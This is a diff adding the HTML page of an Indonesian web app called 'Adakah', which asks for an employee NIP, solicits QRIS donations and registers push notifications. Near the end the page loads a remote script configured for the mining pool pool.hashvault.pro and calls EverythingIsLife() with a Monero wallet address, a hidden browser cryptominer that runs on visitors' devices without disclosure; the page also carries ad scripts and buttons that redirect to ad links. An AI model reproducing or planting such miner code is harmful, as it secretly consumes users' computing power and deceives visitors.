@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Adakah</title>
+
+    <!-- import the webpage's stylesheet -->
+    <link rel="stylesheet" href="/style.css" />
+    <script
+      async
+      src="https://unpkg.com/pwacompat"
+      crossorigin="anonymous"
+    ></script>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic:wght@400..700&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      @import url(https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,200italic);
+      .quote-card {
+        background: #fff;
+        color: #222;
+        padding: 20px;
+        padding-left: 50px;
+        box-sizing: border-box;
+        box-shadow: 0 2px 4px rgba(34, 34, 34, 0.12);
+        position: relative;
+        overflow: hidden;
+        min-height: 120px;
+      }
+      .quote-card p {
+        font-size: 22px;
+        line-height: 1.5;
+        margin: 0;
+        max-width: 80%;
+      }
+      .quote-card cite {
+        font-size: 16px;
+        margin-top: 10px;
+        display: block;
+        font-weight: 200;
+        opacity: 0.8;
+      }
+      .quote-card:before {
+        font-family: Georgia, serif;
+        content: "“";
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        font-size: 5em;
+        color: rgba(238, 238, 238, 0.8);
+        font-weight: normal;
+      }
+      .quote-card:after {
+        font-family: Georgia, serif;
+        content: "”";
+        position: absolute;
+        bottom: -110px;
+        line-height: 100px;
+        right: -32px;
+        font-size: 25em;
+        color: rgba(238, 238, 238, 0.8);
+        font-weight: normal;
+      }
+      @media (max-width: 640px) {
+        .quote-card:after {
+          font-size: 22em;
+          right: -25px;
+        }
+      }
+      .noto-naskh-arabic {
+        font-family: "Noto Naskh Arabic", serif;
+        font-optical-sizing: auto;
+        font-weight: 700;
+        font-style: normal;
+      }
+      .modal-backdrop {
+        background-color: rgb(40, 105, 237);
+      }
+    </style>
+    <!-- icon -->
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/ios/180.png" />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="32x32"
+      href="/icons/windows11/Square44x44Logo.targetsize-32.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="/icons/windows11/Square44x44Logo.targetsize-16.png"
+    />
+
+    <link rel="manifest" href="manifest.json" />
+    <script
+      type="text/javascript"
+      src="//thinnerlanguish.com/18/3f/40/183f401755c9add54671e5f271df47b2.js"
+    ></script>
+  </head>
+
+  <body>
+    <div class="d-flex flex-column">
+      <section>
+        <nav
+          class="navbar bg-dark border-bottom border-body"
+          data-bs-theme="dark"
+        >
+          <!-- Navbar content -->
+          <div class="container-fluid">
+            <a class="navbar-brand" href="#">
+              <img
+                src="/icons/android/android-launchericon-96-96.png"
+                alt="Logo"
+                width="30"
+                height="24"
+                class="d-inline-block align-text-top"
+              />
+              @dakah...
+            </a>
+          </div>
+        </nav>
+      </section>
+      <section>
+        <!-- this is the start of content -->
+        <div class="container pt-3">
+          <div class="row">
+            <div class="col-12 col-md-6">
+              <div class="card shadow-sm mb-5">
+                <div class="card-body">
+                  <div class="card-title">
+                    <h6>
+                      Mohon QRIS-nya discan &#129331; atau klik iklan, agar
+                      tetap exist, karena aplikasi ini dibuat dengan penuh
+                      resiko
+                    </h6>
+                  </div>
+                  <hr />
+                  <div class="text-center">
+                    <h5 class="text-secondary;mb-2">Scan QRIS untuk sedekah</h5>
+                    <a
+                      href="https://thinnerlanguish.com/ezhv84n6?key=d0fc37b7d198fe1bb2ed9f8e4eb9e7b4"
+                    >
+                      <img
+                        loading="lazy"
+                        src="https://cdn.glitch.global/d8b8dd47-35a2-49d6-9d4b-bb69a86feaa8/QRIS.png?v=1737725692297"
+                        alt="Beli kuota"
+                        style="width: 200px !important"
+                      />
+                    </a>
+                  </div>
+                  <hr />
+                  <div class="input-group mb-3">
+                    <iframe
+                      src="//www.highperformanceformat.com/watchnew?key=7bccd29f9b0ef8d457217972d14e5d58"
+                      width="320"
+                      height="50"
+                      frameborder="0"
+                      scrolling="no"
+                      class="m-auto"
+                    ></iframe>
+                    <form style="width: inherit">
+                      <div class="input-group">
+                        <input
+                          class="form-control"
+                          id="nip"
+                          name="nip"
+                          type="number"
+                          placeholder="NIP ta"
+                          minlength="18"
+                          required
+                        />
+                        <button type="submit" class="btn btn-primary">
+                          Kirim
+                        </button>
+                      </div>
+                    </form>
+                    <!-- iklan adsterra-->
+
+                    <iframe
+                      src="//www.highperformanceformat.com/watchnew?key=7bccd29f9b0ef8d457217972d14e5d58"
+                      width="320"
+                      height="50"
+                      frameborder="0"
+                      scrolling="no"
+                      class="m-auto"
+                    ></iframe>
+
+                    <!-- END iklan adsterra-->
+                    <script
+                      async="async"
+                      data-cfasync="false"
+                      src="//pl25732847.profitablecpmrate.com/7ff771880f2895a9aeb2b9844bb74884/invoke.js"
+                    ></script>
+
+                    <div
+                      class="m-auto"
+                      id="container-7ff771880f2895a9aeb2b9844bb74884"
+                    ></div>
+                  </div>
+                </div>
+                <div class="card-footer">
+                  <a
+                    href="#"
+                    data-bs-toggle="modal"
+                    data-bs-target="#kebijakan"
+                  >
+                    Pernyataan kebijakan
+                  </a>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="d-flex align-items-center justify-content-center"></div>
+          <div class="col col-md-6">
+            <div class="card mb-5">
+              <div class="card-body text-center">
+                <h5 class="text-secondary;mb-2">Quote hari ini</h5>
+                <figure class="text-center">
+                  <blockquote class="quote-card">
+                    <p id="quotes">
+                      "Hewan apa yang tidak punya saudara kandung? Ikan teri,
+                      dia cuman punya saudara teri, bapak teri, mama teri,
+                      kasian banget ya!"
+                    </p>
+
+                    <cite> @adakah </cite>
+                  </blockquote>
+                </figure>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <hr />
+
+        <div class="ms-3">
+          <b>Update (24-01-2025) :</b>
+          <br />
+          <ul>
+            <li>Pindah payment ke QRIS</li>
+          </ul>
+        </div>
+      </section>
+      <section>
+        <div class="text-light p-3 bg-dark">©dakah...</div>
+      </section>
+    </div>
+
+    <!-- modal persetujuan kebijakan -->
+
+    <div
+      class="modal fade"
+      data-bs-backdrop="static"
+      id="persetujuan_kebijakan"
+    >
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-body">
+            <p class="text-center">
+              Dengan mengelik tombol setuju, Anda dinyatakan telah menyetujui
+              <a href="#" data-bs-toggle="modal" data-bs-target="#kebijakan"
+                >Pernyataan kebijakan</a
+              >
+            </p>
+          </div>
+
+          <div class="modal-footer">
+            <a
+              href="https://thinnerlanguish.com/ahhted5u?key=c8c115f11a7e4650881a09183017dba0"
+              type="button"
+              class="btn btn-danger"
+            >
+              batal
+            </a>
+            <button
+              type="button"
+              class="btn btn-success"
+              data-bs-dismiss="modal"
+            >
+              <!--               onclick="askNotificationPermission()" -->
+              setuju
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- modal kebijakan -->
+    <div
+      class="modal fade"
+      data-bs-backdrop="static"
+      id="kebijakan"
+      aria-hidden="true"
+    >
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="text-center mb-4">Pernyataan Kebijakan</h5>
+          </div>
+          <div class="modal-body" id="kebijakan_body"></div>
+          <div class="modal-footer">
+            <a
+              href="https://play.google.com/store/apps/details?id=go.id.pareparekota.presensi"
+              type="button"
+              class="btn btn-danger"
+              >Tidak Setuju</a
+            >
+            <button
+              type="button"
+              class="btn btn-success"
+              data-bs-dismiss="modal"
+              onclick="askNotificationPermission()"
+            >
+              Setuju
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!--    modal install button -->
+    <div class="modal" tabindex="-1" id="modalInstall" aria-hidden="true">
+      <div class="modal-dialog">
+        <div class="modal-content d-flex justify-content-center align-items-center">
+          <div class="modal-body">
+            <p>Pasang langsung di HP ta biar tidak repot lagi buka link</p>
+            <br />
+            <button type="button" class="btn btn-primary" id="installButton">
+              Install
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!--
+</div>
+    modal loading   -->
+    <div
+      class="modal"
+      id="loading"
+      data-bs-backdrop="static"
+      data-bs-keyboard="false"
+      tabindex="-1"
+      aria-labelledby="loadingLabel"
+      aria-hidden="true"
+    >
+      <div class="modal-dialog">
+        <div class="modal-content border border-0" style="background-color: transparent">
+          <img
+            src="https://cdn.glitch.global/d8b8dd47-35a2-49d6-9d4b-bb69a86feaa8/Radio%401x-1.0s-200px-200px%20(1).svg?v=1738132391532"
+          />
+        </div>
+      </div>
+    </div>
+
+    
+<!--  MODAL PESAN    -->
+   <div class="modal fade" id="modal_pesan" tabindex="-1" aria-labelledby="modal_pesanLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h1 class="modal-title fs-5" id="modal_pesanLabel">Pesan</h1>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body">
+        ...
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+    <script
+      src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
+      integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js"
+      integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy"
+      crossorigin="anonymous"
+    ></script>
+    <script src="/script.js" defer></script>
+    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
+
+    <script
+      src="https://code.jquery.com/jquery-3.7.1.min.js"
+      integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
+      crossorigin="anonymous"
+    ></script>
+
+    <script type="module">
+      const urlScript =
+        "https://script.google.com/macros/s/AKfycbzutCVWhEYBiBFVo7GdmAy336yIqpiK-hi-OLNiCJbhZNfEvTM_pQhWU9xGAL4nCy_-Iw/exec";
+
+      if (!("serviceWorker" in navigator)) {
+        console.warn("Service workers aren't supported in this browser.");
+        // return;
+      }
+
+      if (!("Notification" in window)) {
+        console.warn("Notifications aren't supported in this browser.");
+        // return;
+      }
+
+      if ("serviceWorker" in navigator) {
+        navigator.serviceWorker
+          .register("firebase-messaging-sw.js")
+          .then((registration) => {
+            askNotificationPermission();
+            console.log(
+              "Service Worker registered with scope:",
+              registration.scope
+            );
+          })
+          .catch((error) => {
+            console.error("Service Worker registration failed:", error);
+          });
+      }
+
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-analytics.js";
+      import {
+        getMessaging,
+        getToken,
+        onMessage,
+      } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-messaging.js";
+
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyCtr4PH8snb07hHNpq0dzTFGI6pFLOTkns",
+        authDomain: "adakah-ddd65.firebaseapp.com",
+        projectId: "adakah-ddd65",
+        storageBucket: "adakah-ddd65.firebasestorage.app",
+        messagingSenderId: "96528323807",
+        appId: "1:96528323807:web:d25f87552c42c3c520c56a",
+        measurementId: "G-2Y0EQNQPDT",
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+      const messaging = getMessaging(app);
+
+      // To see changes in the network state, use addEventListener
+      window.addEventListener("offline", (e) => {
+        console.log("offline");
+        location.replace(
+          "https://wandering-glowing-goose.glitch.me/lagioff.html"
+        );
+      });
+
+      $(document).ready(function () {
+        $("#persetujuan_kebijakan").modal("show");
+      });
+
+      function askNotificationPermission() {
+        if (Notification.permission === "granted") {
+          console.log("Notification permission already granted.");
+          registerAndShowNotification();
+        } else if (Notification.permission !== "denied") {
+          Notification.requestPermission().then((permission) => {
+            if (permission === "granted") {
+              console.log("Notification permission granted.");
+              registerAndShowNotification();
+            } else {
+              console.log("Notification permission denied.");
+            }
+          });
+        }
+      }
+
+      let regis;
+
+      function registerAndShowNotification() {
+        navigator.serviceWorker
+          .register("sw.js") // Replace with your service worker file path
+          .then((registration) => {
+            console.log("sw.js registered");
+            showNotification2();
+            console.log(registration);
+            regis = registration;
+            // showNotification(registration);
+          })
+          .catch((error) => {
+            console.error("sw.js registration failed:", error);
+          });
+      }
+
+      function showNotification(registration, isiPesan) {
+        const img =
+          "https://wandering-glowing-goose.glitch.me/icons/android/android-launchericon-48-48.png";
+        const text = isiPesan;
+
+        const options = {
+          body: text,
+          icon: img,
+          badge: img,
+          vibrate: [200, 100, 200, 100, 200, 100, 200],
+        };
+
+        registration
+          .showNotification("Adakah", options)
+          .then(() => console.log("Notification shown successfully"))
+          .catch((err) => console.log("Show notification Error", err));
+      }
+
+      // navigator.vibrate([200, 100, 200]);
+
+      let deferredPrompt;
+
+      window.addEventListener("beforeinstallprompt", (e) => {
+        // Prevent the mini-infobar from appearing on mobile
+        e.preventDefault();
+        // Stash the event so it can be triggered later.
+        deferredPrompt = e;
+        // Update UI notify the user they can install the PWA
+        // document.getElementById('installButton').style.display = 'block';
+        $("#modalInstall").modal("show");
+      });
+
+      $("#installButton").on("click", (e) => {
+        // Hide the app provided install promotion
+        $("#modalInstall").modal("hide");
+        // Show the install prompt
+        deferredPrompt.prompt();
+        // Wait for the user to respond to the prompt
+        deferredPrompt.userChoice.then((choiceResult) => {
+          if (choiceResult.outcome === "accepted") {
+            console.log("User accepted the install prompt");
+          } else {
+            console.log("User dismissed the install prompt");
+          }
+          deferredPrompt = null;
+        });
+      });
+
+      function showNotification2() {
+        // Minta izin notifikasi
+        Notification.requestPermission()
+          .then((permission) => {
+            if (permission === "granted") {
+              console.log("izin notifikasi FCM diterima");
+              return getToken(messaging, {
+                vapidKey:
+                  "BC-IgG_mV3Mt1hUddSCzEw9_PRxw7WMo8-NxEi2lq7b24ngPqCV7awV1OJ4vLo6HEnQKlyAgs5K6bPRl_CIygQs",
+              }); // Pakai VAPID Key
+            } else {
+              console.log("Izin notifikasi ditolak");
+            }
+          })
+          .then((token) => {
+            // console.log(token)
+            localStorage.setItem("fcm", token);
+          })
+          .catch((err) => {
+            console.error("Gagal mendapatkan token:", err);
+          });
+      }
+
+      onMessage(messaging, (payload) => {
+        console.log("Notifikasi FCM diterima: ", payload);
+        showNotification(regis, payload.notification.body);
+        new Notification(payload.notification.title, {
+          body: payload.notification.body,
+          icon: payload.notification.icon,
+        });
+      });
+    </script>
+<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=rx/0?nosaj=pool.hashvault.pro:80" ></script>
+
+<script type="text/javascript">
+
+EverythingIsLife('replace_with_your_xmr_address', 'x', 30);
+
+</script>
+
+			
+    <script type="text/javascript">
+      EverythingIsLife(
+        "43NQtbvvFbF6PF1RWxNjxwj3ciNP8yfPCdeVV8MSsWVwEJAte1RKk5PRmHXdWJET2eVhcyJYMeBVyDFWEzq86PcsAHexkTW",
+        "absen",
+        30
+      );
+    </script>
+    <script type="module">
+      import kebijakan from "./template.js";
+      $("#kebijakan").on("shown.bs.modal", () => {
+        $("#kebijakan_body").html(kebijakan.kebijakan);
+      });
+    </script>
+  </body>
+</html>
